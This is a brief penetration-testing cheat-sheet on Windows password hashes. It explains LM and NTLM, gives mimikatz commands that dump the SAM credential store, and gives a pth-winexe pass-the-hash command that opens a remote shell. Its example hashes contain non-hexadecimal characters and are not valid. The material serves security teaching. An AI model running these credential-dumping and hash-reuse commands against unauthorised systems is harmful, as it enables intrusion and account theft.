# Password Hashes

> Hashing is the process of converting a given key into another value. A hash function is used to generate the new value according to a mathematical algorithm. A good hash function uses a one-way hashing algorithm, or in other words, the hash cannot be converted back into the original key.

## Identifying Password Hashes

Once we have collected a hash we can try to discover which type of hash is by using the hashid tool:

```bash
hashid $HASH
```

## Windows LM & NTLM

Windows NT up to Windows 2003 store two different password hashes in the SAM: LM and NTLN. LM is very weak and a hash-lookup attack shouldn't be a problem (doesn't include salts). Let's take an example:

**Administrator:500:42f29043y123fa9c74f23606c6g522b0:71759a1bb2web4da43e676d6b7190711:::**

The LM is the hash in the left side and NTLM is the hash on the right side:

**LM:** 42f29043y123fa9c74f23606c6g522b0

**NTML:** 71759a1bb2web4da43e676d6b7190711

From Windows Vista, Windows disables LM by default and uses NTLM, however, NTLM hashes stored in the SAM database are still not salted.

In order to dump the SAM database we can use mimikatz (under administrative command prompt) and execute, in order, the following commands:

```bash
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
```

## Passing The Hash

Once we discovered a Windows HASH we can login into a remote machine using the user and hash we found (if the user exists).

```bash
#-U: user
#%aad3b435b51404eeaad3b435b51404ee: LM part (since hash should be LM:NTLM format).
pth-winexe -U $USER%aad3b435b51404eeaad3b435b51404ee:$NTLMHASH //$IPADDRESS cmd
```
